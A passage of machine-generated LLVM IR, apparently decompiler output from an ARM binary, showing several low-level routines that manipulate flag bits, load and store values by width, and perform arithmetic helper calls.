  br i1 %v9_11840, label %dec_label_pc_1185c, label %dec_label_pc_11848

dec_label_pc_11848:                               ; preds = %dec_label_pc_1183c
  store i32 %arg3, i32* @r0, align 4
  %v0_1184c = call i32 @function_d8c8()
  %v2_11850 = icmp eq i32 %v0_1184c, 0
  br i1 %v2_11850, label %dec_label_pc_11848.dec_label_pc_1185c_crit_edge, label %bb13

dec_label_pc_11848.dec_label_pc_1185c_crit_edge:  ; preds = %dec_label_pc_11848
  %v0_11864.pre = load i32, i32* @r6, align 4
  %v0_1185c.pre = load i32, i32* @r5, align 4
  %v0_11860.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_11868.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_1185c

bb13:                                             ; preds = %dec_label_pc_11848
  %v1_11854 = load i32, i32* @r4, align 4
  store i32 %v1_11854, i32* @r6, align 4
  br label %dec_label_pc_11870

dec_label_pc_1185c:                               ; preds = %dec_label_pc_11848.dec_label_pc_1185c_crit_edge, %dec_label_pc_11740, %dec_label_pc_1183c
  %v2_11868 = phi i32 [ %v2_11868.pre, %dec_label_pc_11848.dec_label_pc_1185c_crit_edge ], [ %v3_11740, %dec_label_pc_11740 ], [ %v3_11740, %dec_label_pc_1183c ]
  %v0_11860 = phi i32 [ %v0_11860.pre, %dec_label_pc_11848.dec_label_pc_1185c_crit_edge ], [ %arg1, %dec_label_pc_11740 ], [ %arg1, %dec_label_pc_1183c ]
  %v0_1185c = phi i32 [ %v0_1185c.pre, %dec_label_pc_11848.dec_label_pc_1185c_crit_edge ], [ %arg3, %dec_label_pc_11740 ], [ %arg3, %dec_label_pc_1183c ]
  %v0_11864 = phi i32 [ %v0_11864.pre, %dec_label_pc_11848.dec_label_pc_1185c_crit_edge ], [ %arg2, %dec_label_pc_11740 ], [ %arg2, %dec_label_pc_1183c ]
  store i32 %v2_11868, i32* @r4, align 4
  store i32 %v9_11740, i32* @r6, align 4
  store i32 %v15_11740, i32* @lr, align 4
  %v3_1186c = inttoptr i32 %v0_1185c to i8*
  %v4_1186c = call i32 @function_11684(i8* %v3_1186c, i32 %v0_11860, i32 %v0_11864)
  br label %dec_label_pc_11870

dec_label_pc_11870:                               ; preds = %bb13, %dec_label_pc_117f4, %dec_label_pc_117e4, %dec_label_pc_117cc, %dec_label_pc_117a8, %dec_label_pc_11820, %bb10, %dec_label_pc_1185c
  %v0_11870 = load i32, i32* @r6, align 4
  %v2_11874 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11874, i32* @r4, align 4
  store i32 %v6_11740, i32* @r5, align 4
  store i32 %v9_11740, i32* @r6, align 4
  store i32 %v12_11740, i32* @r7, align 4
  ret i32 %v0_11870

; uselistorder directives
  uselistorder i32 %v2_11828, { 1, 0 }
  uselistorder i32 %v2_11800, { 1, 0 }
  uselistorder i32 %v0_117e8.v0_117f4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_117f4, { 1, 0, 2 }
  uselistorder i32 %v2_11774, { 2, 0, 1, 3 }
  uselistorder i32 %v9_11740, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %arg3, { 0, 1, 5, 2, 8, 7, 6, 3, 4 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_11870, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_1185c, { 0, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @function_11878(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11878:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11878 = load i32, i32* @r4, align 4
  store i32 %v3_11878, i32* %stack_var_-8, align 4
  %v3_1187c = load i8, i8* %arg1, align 1
  %v4_1187c = zext i8 %v3_1187c to i32
  store i32 %v4_1187c, i32* %r2.global-to-local, align 4
  %v2_11880 = add i32 %tmp, 1
  %v3_11880 = inttoptr i32 %v2_11880 to i8*
  %v4_11880 = load i8, i8* %v3_11880, align 1
  %v5_11880 = zext i8 %v4_11880 to i32
  store i32 %v5_11880, i32* %r3.global-to-local, align 4
  %v4_11884 = mul nuw nsw i32 %v5_11880, 256
  %v5_11884 = or i32 %v4_11884, %v4_1187c
  store i32 %v5_11884, i32* %r2.global-to-local, align 4
  %v2_11888 = and i32 %v5_11884, %arg2
  %v4_11888 = icmp eq i32 %v2_11888, 0
  store i1 %v4_11888, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_11888, label %dec_label_pc_11894, label %dec_label_pc_118ac

dec_label_pc_11894:                               ; preds = %dec_label_pc_11878
  %v1_11894 = and i32 %v5_11884, 2176
  %v2_11894 = icmp eq i32 %v1_11894, 0
  store i1 %v2_11894, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11894, label %dec_label_pc_1189c, label %dec_label_pc_118c0

dec_label_pc_1189c:                               ; preds = %dec_label_pc_11894
  %v2_1189c = or i32 %v5_11884, %arg2
  store i32 %v2_1189c, i32* %r2.global-to-local, align 4
  %v3_118a0 = sdiv i32 %v2_1189c, 256
  store i32 %v3_118a0, i32* %r3.global-to-local, align 4
  %v1_118a4 = trunc i32 %v3_118a0 to i8
  store i8 %v1_118a4, i8* %v3_11880, align 1
  %v0_118a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_118a8 = trunc i32 %v0_118a8 to i8
  store i8 %v1_118a8, i8* %arg1, align 1
  %v0_118ac.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_118ac

dec_label_pc_118ac:                               ; preds = %dec_label_pc_11878, %dec_label_pc_1189c
  %v0_118f8 = phi i32 [ %tmp, %dec_label_pc_11878 ], [ %v0_118ac.pre, %dec_label_pc_1189c ]
  %v1_118ac = inttoptr i32 %v0_118f8 to i8*
  %v2_118ac = load i8, i8* %v1_118ac, align 1
  %v3_118ac = zext i8 %v2_118ac to i32
  store i32 %v3_118ac, i32* %r2.global-to-local, align 4
  %v1_118b0 = add i32 %v0_118f8, 1
  %v2_118b0 = inttoptr i32 %v1_118b0 to i8*
  %v3_118b0 = load i8, i8* %v2_118b0, align 1
  %v4_118b0 = zext i8 %v3_118b0 to i32
  store i32 %v4_118b0, i32* %r3.global-to-local, align 4
  %v4_118b4 = mul nuw nsw i32 %v4_118b0, 256
  %v5_118b4 = or i32 %v4_118b4, %v3_118ac
  store i32 %v5_118b4, i32* @ip, align 4
  %v1_118b8 = and i32 %v3_118ac, 32
  %v2_118b8 = icmp eq i32 %v1_118b8, 0
  store i1 %v2_118b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_118b8, label %dec_label_pc_118e8, label %dec_label_pc_118c0

dec_label_pc_118c0:                               ; preds = %dec_label_pc_11894, %dec_label_pc_118ac
  %v0_118c0 = call i32 @function_cec4()
  store i32 %v0_118c0, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_118c8 = inttoptr i32 %v0_118c0 to i32*
  store i32 9, i32* %v2_118c8, align 4
  br label %dec_label_pc_118cc

dec_label_pc_118cc:                               ; preds = %dec_label_pc_11910, %dec_label_pc_118c0
  %v0_118cc = load i32, i32* @r4, align 4
  %v1_118cc = inttoptr i32 %v0_118cc to i32*
  %v2_118cc = load i32, i32* %v1_118cc, align 4
  %v1_118d0 = or i32 %v2_118cc, 8
  store i32 %v1_118d0, i32* %r3.global-to-local, align 4
  %v3_118d4 = sdiv i32 %v2_118cc, 256
  store i32 %v3_118d4, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_118dc = trunc i32 %v3_118d4 to i8
  %v3_118dc = add i32 %v0_118cc, 1
  %v4_118dc = inttoptr i32 %v3_118dc to i8*
  store i8 %v1_118dc, i8* %v4_118dc, align 1
  %v0_118e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_118e0 = trunc i32 %v0_118e0 to i8
  %v2_118e0 = load i32, i32* @r4, align 4
  %v3_118e0 = inttoptr i32 %v2_118e0 to i8*
  store i8 %v1_118e0, i8* %v3_118e0, align 1
  %v2_118e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_118e4, i32* @r4, align 4
  ret i32 -1

dec_label_pc_118e8:                               ; preds = %dec_label_pc_118ac
  %tmp15 = urem i8 %v2_118ac, 4
  %v2_118e8 = icmp eq i8 %tmp15, 0
  store i1 %v2_118e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_118e8, label %dec_label_pc_1194c, label %dec_label_pc_118f0

dec_label_pc_118f0:                               ; preds = %dec_label_pc_118e8
  %v1_118f0 = and i32 %v3_118ac, 4
  store i32 %v1_118f0, i32* @r1, align 4
  %v2_118f0 = icmp eq i32 %v1_118f0, 0
  store i1 %v2_118f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_118f0, label %dec_label_pc_118f8, label %dec_label_pc_11928

dec_label_pc_118f8:                               ; preds = %dec_label_pc_118f0
  %v1_118f8 = add i32 %v0_118f8, 20
  %v2_118f8 = inttoptr i32 %v1_118f8 to i32*
  %v3_118f8 = load i32, i32* %v2_118f8, align 4
  store i32 %v3_118f8, i32* %r2.global-to-local, align 4
  %v1_118fc = add i32 %v0_118f8, 16
  %v2_118fc = inttoptr i32 %v1_118fc to i32*
  %v3_118fc = load i32, i32* %v2_118fc, align 4
  store i32 %v3_118fc, i32* %r3.global-to-local, align 4
  %v9_11900 = icmp eq i32 %v3_118f8, %v3_118fc
  store i1 %v9_11900, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11900, label %dec_label_pc_11908, label %dec_label_pc_11910

dec_label_pc_11908:                               ; preds = %dec_label_pc_118f8
  %v1_11908 = and i32 %v3_118ac, 2
  %v2_11908 = icmp eq i32 %v1_11908, 0
  store i1 %v2_11908, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11908, label %dec_label_pc_11928, label %dec_label_pc_11910

dec_label_pc_11910:                               ; preds = %dec_label_pc_118f8, %dec_label_pc_11908
  %v1_11910 = and i32 %v4_118b4, 1024
  %v2_11910 = icmp eq i32 %v1_11910, 0
  store i1 %v2_11910, i1* %cpsr_z.global-to-local, align 1
  %tmp13 = udiv i32 %v1_11910, 1024
  %tmp14 = add nuw nsw i32 %tmp13, 1
  store i32 %tmp14, i32* @r2, align 4
  %v0_1191c = call i32 @function_137d0()
  store i32 %v0_1191c, i32* %r0.global-to-local, align 4
  %v2_11920 = icmp eq i32 %v0_1191c, 0
  store i1 %v2_11920, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11920, label %.dec_label_pc_11928_crit_edge, label %dec_label_pc_118cc

.dec_label_pc_11928_crit_edge:                    ; preds = %dec_label_pc_11910
  %v0_11928.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11928

dec_label_pc_11928:                               ; preds = %.dec_label_pc_11928_crit_edge, %dec_label_pc_118f0, %dec_label_pc_11908
  %v2_11938 = phi i32 [ %v0_11928.pre, %.dec_label_pc_11928_crit_edge ], [ %v0_118f8, %dec_label_pc_118f0 ], [ %v0_118f8, %dec_label_pc_11908 ]
  %v1_11928 = inttoptr i32 %v2_11938 to i32*
  %v2_11928 = load i32, i32* %v1_11928, align 4
  store i32 %v2_11928, i32* %r3.global-to-local, align 4
  %v1_1192c = add i32 %v2_11938, 8
  %v2_1192c = inttoptr i32 %v1_1192c to i32*
  %v3_1192c = load i32, i32* %v2_1192c, align 4
  store i32 %v3_1192c, i32* %r1.global-to-local, align 4
  %v1_11930 = and i32 %v2_11928, -4
  store i32 %v1_11930, i32* %r3.global-to-local, align 4
  %v3_11934 = sdiv i32 %v2_11928, 256
  store i32 %v3_11934, i32* %r2.global-to-local, align 4
  %v1_11938 = trunc i32 %v3_11934 to i8
  %v3_11938 = add i32 %v2_11938, 1
  %v4_11938 = inttoptr i32 %v3_11938 to i8*
  store i8 %v1_11938, i8* %v4_11938, align 1
  %v0_1193c = load i32, i32* %r1.global-to-local, align 4
  %v1_1193c = load i32, i32* @r4, align 4
  %v2_1193c = add i32 %v1_1193c, 20
  %v3_1193c = inttoptr i32 %v2_1193c to i32*
  store i32 %v0_1193c, i32* %v3_1193c, align 4
  %v0_11940 = load i32, i32* %r3.global-to-local, align 4
  %v1_11940 = trunc i32 %v0_11940 to i8
  %v2_11940 = load i32, i32* @r4, align 4
  %v3_11940 = inttoptr i32 %v2_11940 to i8*
  store i8 %v1_11940, i8* %v3_11940, align 1
  %v0_11944 = load i32, i32* %r1.global-to-local, align 4
  %v1_11944 = load i32, i32* @r4, align 4
  %v2_11944 = add i32 %v1_11944, 24
  %v3_11944 = inttoptr i32 %v2_11944 to i32*
  store i32 %v0_11944, i32* %v3_11944, align 4
  %v0_11948 = load i32, i32* %r1.global-to-local, align 4
  %v1_11948 = load i32, i32* @r4, align 4
  %v2_11948 = add i32 %v1_11948, 16
  %v3_11948 = inttoptr i32 %v2_11948 to i32*
  store i32 %v0_11948, i32* %v3_11948, align 4
  %v0_1194c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1194c

dec_label_pc_1194c:                               ; preds = %dec_label_pc_118e8, %dec_label_pc_11928
  %v2_11958 = phi i32 [ %v0_118f8, %dec_label_pc_118e8 ], [ %v0_1194c.pre, %dec_label_pc_11928 ]
  %v1_1194c = inttoptr i32 %v2_11958 to i32*
  %v2_1194c = load i32, i32* %v1_1194c, align 4
  %v1_11950 = or i32 %v2_1194c, 64
  store i32 %v1_11950, i32* %r2.global-to-local, align 4
  %v3_11954 = sdiv i32 %v2_1194c, 256
  store i32 %v3_11954, i32* %r3.global-to-local, align 4
  %v1_11958 = trunc i32 %v3_11954 to i8
  %v3_11958 = add i32 %v2_11958, 1
  %v4_11958 = inttoptr i32 %v3_11958 to i8*
  store i8 %v1_11958, i8* %v4_11958, align 1
  %v0_1195c = load i32, i32* @r4, align 4
  %v1_1195c = add i32 %v0_1195c, 1
  %v2_1195c = inttoptr i32 %v1_1195c to i8*
  %v3_1195c = load i8, i8* %v2_1195c, align 1
  %v4_1195c = zext i8 %v3_1195c to i32
  %v3_11960 = mul nuw nsw i32 %v4_1195c, 256
  store i32 %v3_11960, i32* %r3.global-to-local, align 4
  %v1_11964 = and i32 %v3_11960, 2816
  store i32 %v1_11964, i32* %r0.global-to-local, align 4
  %v2_11964 = icmp eq i32 %v1_11964, 0
  store i1 %v2_11964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11964, label %bb9, label %.thread1

bb9:                                              ; preds = %dec_label_pc_1194c
  %v2_11968 = add i32 %v0_1195c, 12
  %v3_11968 = inttoptr i32 %v2_11968 to i32*
  %v4_11968 = load i32, i32* %v3_11968, align 4
  store i32 %v4_11968, i32* %r3.global-to-local, align 4
  br label %bb10

.thread1:                                         ; preds = %dec_label_pc_1194c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb10

bb10:                                             ; preds = %bb9, %.thread1
  %v0_11970 = load i32, i32* %r2.global-to-local, align 4
  %v1_11970 = trunc i32 %v0_11970 to i8
  %v3_11970 = inttoptr i32 %v0_1195c to i8*
  store i8 %v1_11970, i8* %v3_11970, align 1
  %v0_11974 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11974, label %bb11, label %bb12

bb11:                                             ; preds = %bb10
  %v1_11974 = load i32, i32* %r3.global-to-local, align 4
  %v2_11974 = load i32, i32* @r4, align 4
  %v3_11974 = add i32 %v2_11974, 28
  %v4_11974 = inttoptr i32 %v3_11974 to i32*
  store i32 %v1_11974, i32* %v4_11974, align 4
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v2_11978 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11978, i32* @r4, align 4
  %v8_11978 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_11978

; uselistorder directives
  uselistorder i32 %v3_11960, { 1, 0 }
  uselistorder i32 %v3_11954, { 1, 0 }
  uselistorder i32 %v3_11934, { 1, 0 }
  uselistorder i32 %v2_11938, { 0, 2, 1 }
  uselistorder i1 %v2_118e8, { 1, 0 }
  uselistorder i32 %v3_118d4, { 1, 0 }
  uselistorder i32 %v3_118ac, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_118f8, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v3_118a0, { 1, 0 }
  uselistorder i32 %v5_11884, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 5, 3, 4 }
  uselistorder i32 1024, { 0, 7, 8, 2, 9, 1, 10, 11, 12, 3, 4, 6, 13, 5 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_1194c, { 1, 0 }
  uselistorder label %dec_label_pc_11928, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11910, { 1, 0 }
  uselistorder label %dec_label_pc_118c0, { 1, 0 }
  uselistorder label %dec_label_pc_118ac, { 1, 0 }
}

define i32 @function_1197c() local_unnamed_addr {
dec_label_pc_1197c:
  %v0_1197c = load i32, i32* @r2, align 4
  %v1_1197c = icmp slt i32 %v0_1197c, 0
  %v0_11980 = load i32, i32* @r0, align 4
  %v1_11984 = and i32 %v0_11980, 2048
  %v2_119b8 = icmp eq i32 %v1_11984, 0
  br i1 %v1_1197c, label %dec_label_pc_119b8, label %dec_label_pc_1198c

dec_label_pc_1198c:                               ; preds = %dec_label_pc_1197c
  br i1 %v2_119b8, label %dec_label_pc_11994, label %dec_label_pc_119c0

dec_label_pc_11994:                               ; preds = %dec_label_pc_1198c
  %v7_11994 = icmp eq i32 %v0_11980, 256
  %v0_11998 = load i32, i32* @r1, align 4
  %v1_11998 = inttoptr i32 %v0_11998 to i32*
  %v2_11998 = load i32, i32* %v1_11998, align 4
  %v2_1199c = urem i32 %v2_11998, 256
  %v2_1199c.v2_11998 = select i1 %v7_11994, i32 %v2_1199c, i32 %v2_11998
  br i1 %v7_11994, label %.thread, label %dec_label_pc_119a4

dec_label_pc_119a4:                               ; preds = %dec_label_pc_11994
  %v7_119a4 = icmp eq i32 %v0_11980, 512
  br i1 %v7_119a4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_119a4
  %v4_119ac = urem i32 %v2_1199c.v2_11998, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_119a4, %dec_label_pc_11994, %bb
  %v1_119b4 = phi i32 [ %v2_11998, %dec_label_pc_119a4 ], [ %v2_1199c, %dec_label_pc_11994 ], [ %v4_119ac, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_119b4

dec_label_pc_119b8:                               ; preds = %dec_label_pc_1197c
  br i1 %v2_119b8, label %dec_label_pc_119c8, label %dec_label_pc_119c0

dec_label_pc_119c0:                               ; preds = %dec_label_pc_1198c, %dec_label_pc_119b8
  %v0_119c0 = load i32, i32* @r1, align 4
  %v1_119c0 = inttoptr i32 %v0_119c0 to i32*
  %v2_119c0 = load i32, i32* %v1_119c0, align 4
  %v3_119c0 = add i32 %v0_119c0, 4
  %v4_119c0 = inttoptr i32 %v3_119c0 to i32*
  %v5_119c0 = load i32, i32* %v4_119c0, align 4
  store i32 %v5_119c0, i32* @r1, align 4
  ret i32 %v2_119c0

dec_label_pc_119c8:                               ; preds = %dec_label_pc_119b8
  %v7_119c8 = icmp eq i32 %v0_11980, 256
  %v0_119cc = load i32, i32* @r1, align 4
  %v1_119cc = inttoptr i32 %v0_119cc to i32*
  %v2_119cc = load i32, i32* %v1_119cc, align 4
  %v2_119d0 = urem i32 %v2_119cc, 256
  %v2_119d0.v2_119cc = select i1 %v7_119c8, i32 %v2_119d0, i32 %v2_119cc
  br i1 %v7_119c8, label %.thread2, label %dec_label_pc_119d8

dec_label_pc_119d8:                               ; preds = %dec_label_pc_119c8
  %v7_119d8 = icmp eq i32 %v0_11980, 512
  br i1 %v7_119d8, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_119d8
  %v4_119dc = mul i32 %v2_119d0.v2_119cc, 65536
  %v4_119e0 = sdiv i32 %v4_119dc, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_119d8, %dec_label_pc_119c8, %bb5
  %v0_119e4 = phi i32 [ %v2_119cc, %dec_label_pc_119d8 ], [ %v2_119d0, %dec_label_pc_119c8 ], [ %v4_119e0, %bb5 ]
  %v3_119e4 = ashr i32 %v0_119e4, 31
  store i32 %v3_119e4, i32* @r1, align 4
  ret i32 %v0_119e4

; uselistorder directives
  uselistorder i32 %v0_119e4, { 1, 0 }
  uselistorder i32 %v2_119d0, { 1, 0 }
  uselistorder i32 %v2_119cc, { 1, 2, 0 }
  uselistorder i32 %v2_1199c, { 1, 0 }
  uselistorder i32 %v2_11998, { 1, 2, 0 }
  uselistorder i1 %v2_119b8, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_119c0, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @function_119ec(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_119ec:
  %tmp = trunc i32 %arg3 to i8
  %tmp2 = ptrtoint i8* %arg1 to i32
  %v7_119ec = icmp eq i32 %arg2, 256
  br i1 %v7_119ec, label %dec_label_pc_11a18, label %dec_label_pc_119f4

dec_label_pc_119f4:                               ; preds = %dec_label_pc_119ec
  %v7_119f4 = icmp eq i32 %arg2, 2048
  br i1 %v7_119f4, label %dec_label_pc_119fc, label %dec_label_pc_11a04

dec_label_pc_119fc:                               ; preds = %dec_label_pc_119f4
  %tmp3 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp3, align 4
  %v5_119fc = add i32 %tmp2, 4
  %v6_119fc = inttoptr i32 %v5_119fc to i32*
  store i32 %arg4, i32* %v6_119fc, align 4
  ret i32 %tmp2

dec_label_pc_11a04:                               ; preds = %dec_label_pc_119f4
  %v7_11a04 = icmp eq i32 %arg2, 512
  %v4_11a08 = sdiv i32 %arg3, 256
  store i32 %v4_11a08, i32* @ip, align 4
  br i1 %v7_11a04, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_11a04
  %tmp4 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp4, align 4
  ret i32 %tmp2

.thread:                                          ; preds = %dec_label_pc_11a04
  %v1_11a14 = trunc i32 %v4_11a08 to i8
  %v4_11a14 = add i32 %tmp2, 1
  %v5_11a14 = inttoptr i32 %v4_11a14 to i8*
  store i8 %v1_11a14, i8* %v5_11a14, align 1
  br label %dec_label_pc_11a18

dec_label_pc_11a18:                               ; preds = %dec_label_pc_119ec, %.thread
  store i8 %tmp, i8* %arg1, align 1
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %v4_11a08, { 1, 0 }
  uselistorder i32 %tmp2, { 4, 1, 0, 2, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_11a18, { 1, 0 }
}

define i32 @function_11a20(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_11a20:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg4, i32* %r7.global-to-local, align 4
  %v1_11a24 = icmp slt i32 %arg4, 0
  %v2_11a24 = icmp eq i32 %arg4, 0
  store i1 %v2_11a24, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v1_11a24, label %dec_label_pc_11a3c, label %dec_label_pc_11a5c

dec_label_pc_11a3c:                               ; preds = %dec_label_pc_11a20
  %v1_11a3c = icmp slt i32 %arg3, 0
  %v2_11a3c = icmp eq i32 %arg3, 0
  store i1 %v2_11a3c, i1* %cpsr_z.global-to-local, align 1
  %v1_11a40 = sub i32 0, %arg4
  store i32 %v1_11a40, i32* %r7.global-to-local, align 4
  br i1 %v1_11a3c, label %dec_label_pc_11a48, label %dec_label_pc_11a5c

dec_label_pc_11a48:                               ; preds = %dec_label_pc_11a3c
  %v1_11a4c = sub i32 0, %arg2
  store i32 %v1_11a4c, i32* %r5.global-to-local, align 4
  %v2_11a4c = icmp eq i32 %arg2, 0
  %v2_11a50 = icmp eq i1 %v2_11a4c, false
  %v5_11a50 = sext i1 %v2_11a50 to i32
  %v6_11a50 = sub i32 %v5_11a50, %arg3
  store i32 %v6_11a50, i32* %r6.global-to-local, align 4
  %v19_11a50 = icmp eq i32 %v6_11a50, 0
  store i1 %v19_11a50, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11a64

dec_label_pc_11a5c:                               ; preds = %dec_label_pc_11a3c, %dec_label_pc_11a20
  br label %dec_label_pc_11a64

dec_label_pc_11a64:                               ; preds = %dec_label_pc_11a48, %dec_label_pc_11a5c
  %storemerge = phi i8 [ 0, %dec_label_pc_11a5c ], [ 1, %dec_label_pc_11a48 ]
  store i8 %storemerge, i8* %stack_var_-40, align 1
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_11a6c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_11a6c, i32* @r1, align 4
  store i32 -1, i32* @r0, align 4
  %v0_11a74 = call i32 @function_14d90()
  store i32 %v0_11a74, i32* %fp.global-to-local, align 4
  %v2_11a84 = call i32 @function_ca30(i32 -1, i32 %v0_11a6c)
  %v1_11a88 = add i32 %v2_11a84, 1
  store i32 %v1_11a88, i32* %sb.global-to-local, align 4
  %v1_11a8c = load i32, i32* %r7.global-to-local, align 4
  %v9_11a8c = icmp eq i32 %v1_11a88, %v1_11a8c
  store i1 %v9_11a8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11a8c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11a64
  %v1_11a90 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_11a90, i32* %sb.global-to-local, align 4
  %v1_11a94 = load i32, i32* %fp.global-to-local, align 4
  %v2_11a94 = add i32 %v1_11a94, 1
  store i32 %v2_11a94, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11a64, %bb
  %v0_11a98 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_11a98, i32* %sl.global-to-local, align 4
  %v0_11a9c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11a9c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11aa0

dec_label_pc_11aa0thread-pre-split:               ; preds = %bb19
  %v0_11aa0.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_11aa8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11aa0

dec_label_pc_11aa0:                               ; preds = %dec_label_pc_11aa0thread-pre-split, %.thread
  %v0_11b10 = phi i32 [ %v0_11aa8.pre, %dec_label_pc_11aa0thread-pre-split ], [ %v1_11a8c, %.thread ]
  %v0_11aa4 = phi i32 [ %v0_11aa0.pr, %dec_label_pc_11aa0thread-pre-split ], [ %v0_11a98, %.thread ]
  %v2_11aa0 = icmp eq i32 %v0_11aa4, 0
  store i1 %v2_11aa0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11aa0, label %dec_label_pc_11b0c, label %dec_label_pc_11ab0

dec_label_pc_11ab0:                               ; preds = %dec_label_pc_11aa0
  %v2_11ab0 = call i32 @function_ca30(i32 %v0_11aa4, i32 %v0_11b10)
  %v0_11ab4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_11ab4, i32* @r1, align 4
  store i32 %v2_11ab0, i32* %r4.global-to-local, align 4
  %v0_11abc = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_11abc, i32* @r0, align 4
  %v0_11ac0 = call i32 @function_14d90()
  store i32 %v0_11ac0, i32* %sl.global-to-local, align 4
  %v0_11acc = load i32, i32* %r6.global-to-local, align 4
  %v2_11ad0 = call i32 @function_ca30(i32 %v0_11acc, i32 %v0_11ab4)
  %v0_11ad4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_11ad4, i32* @r1, align 4
  %v0_11ad8 = load i32, i32* %r4.global-to-local, align 4
  %v1_11ad8 = load i32, i32* %sb.global-to-local, align 4
  %v3_11ad8 = mul i32 %v1_11ad8, %v0_11ad8
  %v4_11ad8 = add i32 %v3_11ad8, %v2_11ad0
  store i32 %v4_11ad8, i32* %r5.global-to-local, align 4
  %v0_11adc = load i32, i32* %r6.global-to-local, align 4
